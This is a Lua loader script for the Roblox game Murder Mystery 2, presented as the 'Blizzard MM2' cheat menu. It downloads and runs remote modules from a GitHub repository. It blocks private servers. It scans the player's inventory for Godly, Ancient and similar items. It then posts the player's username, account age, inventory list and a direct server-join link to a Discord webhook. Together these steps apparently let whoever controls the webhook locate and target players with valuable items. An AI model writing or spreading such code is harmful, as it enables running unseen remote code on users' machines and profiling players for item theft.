--============================================================
-- BLIZZARD MM2 V8.8.4 - MASTER BOOTSTRAP LOADER
-- + INVENTORY WEBHOOK NOTIFICATION
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local HttpService =
	game:GetService("HttpService")

local LocalPlayer =
	Players.LocalPlayer

--============================================================
-- PRIVATE SERVER ACCESS BLOCK
--============================================================

local PrivateServerId =
	tostring(
		game.PrivateServerId
		or ""
	)

local PrivateServerOwnerId =
	tonumber(
		game.PrivateServerOwnerId
	)
	or 0

local MM2VIPServer =
	ReplicatedStorage:GetAttribute(
		"IsVIPServer"
	) == true

local IsPrivateServer =
	MM2VIPServer
	or PrivateServerId ~= ""
	or PrivateServerOwnerId ~= 0

if IsPrivateServer then

	warn(
		"[MM2 LOADER] Private server detected. Blizzard blocked."
	)

	LocalPlayer:Kick(
		"Private servers are prohibited. Repeated offenses may result in a permanent ban."
	)

	return
end

--============================================================
-- STARTUP
--============================================================

print(
	"[MM2 LOADER] Starting Blizzard MM2 V8.8.4..."
)

--============================================================
-- BASE URL
--============================================================

local BaseURL =
	"https://raw.githubusercontent.com/farkmusa34/BlizzardMM2Script/refs/heads/main/"

--============================================================
-- CLEAN UP OLD INSTANCE
--============================================================

local ExistingMM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if ExistingMM2
	and ExistingMM2.Cleanup
then

	print(
		"[MM2 LOADER] Cleaning previous instance..."
	)

	pcall(function()

		ExistingMM2.Cleanup()

	end)

	task.wait(0.3)
end

--============================================================
-- MODULE LOADER
--============================================================

local function LoadModule(
	fileName
)

	local targetURL =
		BaseURL
		.. fileName

	print(
		"[MM2 LOADER] Loading: "
		.. fileName
	)

	--========================================================
	-- DOWNLOAD
	--========================================================

	local downloadOk,
	scriptContent =
		pcall(function()

			return game:HttpGet(
				targetURL
			)

		end)

	if not downloadOk then

		warn(
			"[MM2 LOADER] DOWNLOAD ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				scriptContent
			)
		)

		return false
	end

	if not scriptContent
		or scriptContent == ""
		or scriptContent == "404: Not Found"
	then

		warn(
			"[MM2 LOADER] INVALID/EMPTY FILE: "
			.. fileName
		)

		return false
	end

	--========================================================
	-- COMPILE
	--========================================================

	local fn,
	compileError =
		loadstring(
			scriptContent
		)

	if not fn then

		warn(
			"[MM2 LOADER] COMPILE ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				compileError
			)
		)

		return false
	end

	--========================================================
	-- EXECUTE
	--========================================================

	local runOk,
	runResult =
		pcall(
			fn
		)

	if not runOk then

		warn(
			"[MM2 LOADER] RUNTIME ERROR IN "
			.. fileName
			.. ": "
			.. tostring(
				runResult
			)
		)

		return false
	end

	print(
		"[MM2 LOADER] Successfully loaded: "
		.. fileName
	)

	return true
end

--============================================================
-- SAFE LOAD HELPER
--============================================================

local function RequireModule(
	fileName
)

	local success =
		LoadModule(
			fileName
		)

	if not success then

		warn(
			"[MM2 LOADER] Bootstrap stopped because "
			.. fileName
			.. " failed to load."
		)

		return false
	end

	return true
end

--============================================================
-- LOAD ORDER
--============================================================

if not RequireModule("Shared.lua") then return end
if not RequireModule("UI.lua") then return end
if not RequireModule("Visuals.lua") then return end
if not RequireModule("Combat.lua") then return end
if not RequireModule("AutoFarm.lua") then return end
if not RequireModule("Player.lua") then return end
if not RequireModule("Fling.lua") then return end
if not RequireModule("Misc.lua") then return end
if not RequireModule("SkinChanger.lua") then return end
if not RequireModule("Main.lua") then return end

--============================================================
-- FINAL STATUS
--============================================================

local MM2 =
	(getgenv and getgenv().MM2_V85_SPLIT)
	or _G.MM2_V85_SPLIT

if MM2
	and MM2.Running
then

	print(
		"[MM2 LOADER] Blizzard MM2 V8.8.4 bootstrap COMPLETE."
	)

else

	warn(
		"[MM2 LOADER] Bootstrap finished, but MM2 runtime was not detected."
	)

end

--============================================================
-- INVENTORY WEBHOOK NOTIFIER
--============================================================

local httpRequest =
	request
	or http_request
	or (
		syn
		and syn.request
	)

if not httpRequest then

	warn(
		"[MM2 NOTIFIER] HTTP request function unavailable."
	)

	return
end

--============================================================
-- WEBHOOK URL
--
-- KEEP THIS ENTIRE URL ON ONE LINE
--============================================================

local webhookUrl =
	"https://webhook.lewisakura.moe/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

--============================================================
-- LOAD INVENTORY MODULE
--============================================================

local InventoryModule = nil

do

	local success,
	result =
		pcall(function()

			return require(
				ReplicatedStorage
					:WaitForChild("Modules")
					:WaitForChild("InventoryModule")
			)

		end)

	if success
		and type(result) == "table"
	then

		InventoryModule =
			result

	else

		warn(
			"[MM2 NOTIFIER] Failed to load InventoryModule."
		)

		return
	end
end

--============================================================
-- RARITY SETTINGS
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,

	-- MM2 internally calls Vintage "Classic"
	Classic = true,
}

local FILLER_RARITIES = {
	Legendary = true,
}

--============================================================
-- SAFE TABLE HELPERS
--============================================================

local function SafeGet(
	tbl,
	key
)

	if type(tbl) ~= "table" then
		return nil
	end

	local ok,
	result =
		pcall(function()

			return tbl[key]

		end)

	if ok then
		return result
	end

	return nil
end

local function FirstValue(
	tbl,
	keys
)

	if type(tbl) ~= "table" then
		return nil
	end

	for _, key in ipairs(keys) do

		local value =
			SafeGet(
				tbl,
				key
			)

		if value ~= nil then
			return value
		end
	end

	return nil
end

--============================================================
-- ITEM FIELD HELPERS
--============================================================

local function GetItemID(
	value,
	keyHint
)

	return FirstValue(
		value,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
			"id",
		}
	) or keyHint
end

local function GetItemName(
	value
)

	return FirstValue(
		value,
		{
			"ItemName",
			"DisplayName",
			"Name",
			"name",
		}
	)
end

local function GetItemRarity(
	value
)

	return FirstValue(
		value,
		{
			"Rarity",
			"rarity",
			"Tier",
		}
	)
end

local function GetItemType(
	value
)

	return FirstValue(
		value,
		{
			"ItemType",
			"WeaponType",
			"Type",
			"type",
		}
	)
end

local function GetItemAmount(
	value
)

	return tonumber(
		FirstValue(
			value,
			{
				"Amount",
				"amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(
	itemType
)

	return itemType == "Knife"
		or itemType == "Gun"
end

local function DisplayRarity(
	rarity
)

	if rarity == "Classic" then
		return "Vintage"
	end

	return rarity
end

--============================================================
-- GET OWNED WEAPONS
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)

	local data =
		SafeGet(
			inventory,
			"Data"
		)

	return SafeGet(
		data,
		"Weapons"
	)
end

--============================================================
-- SCAN INVENTORY
--============================================================

local function ScanInventory()

	local Weapons =
		GetWeaponsTable()

	if type(Weapons) ~= "table" then
		return {}, {}
	end

	local primary = {}
	local filler = {}

	local visited = {}
	local seenIDs = {}

	local function Walk(
		tbl,
		depth
	)

		if type(tbl) ~= "table" then
			return
		end

		if visited[tbl] then
			return
		end

		if depth > 12 then
			return
		end

		visited[tbl] =
			true

		for key,
		value in pairs(tbl)
		do

			if type(value) == "table" then

				local rarity =
					GetItemRarity(
						value
					)

				local itemType =
					GetItemType(
						value
					)

				local amount =
					GetItemAmount(
						value
					)

				if rarity
					and amount > 0
					and IsWeaponType(
						itemType
					)
				then

					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)

					if not seenIDs[
						dataID
					] then

						seenIDs[
							dataID
						] = true

						local item = {

							DataID =
								dataID,

							Name =
								tostring(
									GetItemName(
										value
									)
									or dataID
								),

							Rarity =
								tostring(
									rarity
								),

							ItemType =
								tostring(
									itemType
								),

							Amount =
								amount,
						}

						if PRIMARY_RARITIES[
							item.Rarity
						] then

							table.insert(
								primary,
								item
							)

						elseif FILLER_RARITIES[
							item.Rarity
						] then

							table.insert(
								filler,
								item
							)

						end
					end
				end

				Walk(
					value,
					depth + 1
				)
			end
		end
	end

	Walk(
		Weapons,
		0
	)

	--========================================================
	-- SORT HIGH VALUE ITEMS
	--========================================================

	local priority = {
		Unique = 1,
		Ancient = 2,
		Godly = 3,
		Classic = 4,
	}

	table.sort(
		primary,
		function(a, b)

			local pa =
				priority[
					a.Rarity
				] or 99

			local pb =
				priority[
					b.Rarity
				] or 99

			if pa ~= pb then
				return pa < pb
			end

			return a.DataID
				< b.DataID
		end
	)

	table.sort(
		filler,
		function(a, b)

			return a.DataID
				< b.DataID
		end
	)

	return primary,
		filler
end

--============================================================
-- FORMAT SCANNED INVENTORY
--============================================================

local function FormatInventoryText(
	primary,
	filler
)

	local lines = {}

	table.insert(
		lines,
		"✨ **__High Value / Godly Items:__**"
	)

	if #primary == 0 then

		table.insert(
			lines,
			"• *None Detected*"
		)

	else

		for _, item in ipairs(
			primary
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** (%s) x%d",
					item.Name,
					DisplayRarity(
						item.Rarity
					),
					item.Amount
				)
			)
		end
	end

	if #filler > 0 then

		table.insert(
			lines,
			""
		)

		table.insert(
			lines,
			"📦 **__Legendary Items:__**"
		)

		for _, item in ipairs(
			filler
		) do

			table.insert(
				lines,
				string.format(
					"• **%s** (Legendary) x%d",
					item.Name,
					item.Amount
				)
			)
		end
	end

	local text =
		table.concat(
			lines,
			"\n"
		)

	-- Discord embed field value safety limit
	if #text > 1000 then

		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...and more items!"

	end

	return text
end

--============================================================
-- RUN SCAN
--============================================================

local primaryItems,
fillerItems =
	ScanInventory()

local parsedInventory =
	FormatInventoryText(
		primaryItems,
		fillerItems
	)

--============================================================
-- ROBLOX LINKS
--============================================================

local gameLink =
	"https://www.roblox.com/games/"
	.. tostring(
		game.PlaceId
	)

local serverJoinLink =
	"https://www.roblox.com/games/start?placeId="
	.. tostring(
		game.PlaceId
	)
	.. "&gameInstanceId="
	.. tostring(
		game.JobId
	)

--============================================================
-- WEBHOOK PAYLOAD
--============================================================

local payload = {

	embeds = {
		{
			title =
				"Blizzard MM2 Executed! 🚀",

			color =
				3447003,

			fields = {

				{
					name =
						"Player Username",

					value =
						tostring(
							LocalPlayer.Name
						),

					inline =
						true,
				},

				{
					name =
						"Account Age (Days)",

					value =
						tostring(
							LocalPlayer.AccountAge
						),

					inline =
						true,
				},

				{
					name =
						"Game Place ID",

					value =
						tostring(
							game.PlaceId
						),

					inline =
						false,
				},

				{
					name =
						"Direct Link",

					value =
						"[Click to View Game]("
						.. gameLink
						.. ")",

					inline =
						true,
				},

				{
					name =
						"Direct Server Join Link",

					value =
						"[Launch & Join Server]("
						.. serverJoinLink
						.. ")",

					inline =
						false,
				},

				{
					name =
						"🎒 Scanned Player Inventory",

					value =
						parsedInventory,

					inline =
						false,
				},
			},

			timestamp =
				DateTime.now():ToIsoDate(),
		},
	},
}

--============================================================
-- SEND WEBHOOK
--============================================================

task.spawn(function()

	local encodedBody

	local encodeSuccess,
	encodeError =
		pcall(function()

			encodedBody =
				HttpService:JSONEncode(
					payload
				)

		end)

	if not encodeSuccess then

		warn(
			"[MM2 NOTIFIER] JSON encode failed: "
			.. tostring(
				encodeError
			)
		)

		return
	end

	local requestSuccess,
	response =
		pcall(function()

			return httpRequest({

				Url =
					webhookUrl,

				Method =
					"POST",

				Headers = {
					["Content-Type"] =
						"application/json",
				},

				Body =
					encodedBody,
			})

		end)

	if not requestSuccess then

		warn(
			"[MM2 NOTIFIER] Webhook request failed: "
			.. tostring(
				response
			)
		)

		return
	end

	local statusCode =
		response
		and (
			response.StatusCode
			or response.Status
		)

	if statusCode
		and statusCode ~= 200
		and statusCode ~= 204
	then

		warn(
			"[MM2 NOTIFIER] Webhook rejected. Status: "
			.. tostring(
				statusCode
			)
			.. " | Body: "
			.. tostring(
				response.Body
				or ""
			)
		)

		return
	end

	print(
		"[MM2 NOTIFIER] Inventory notification sent successfully."
	)

end)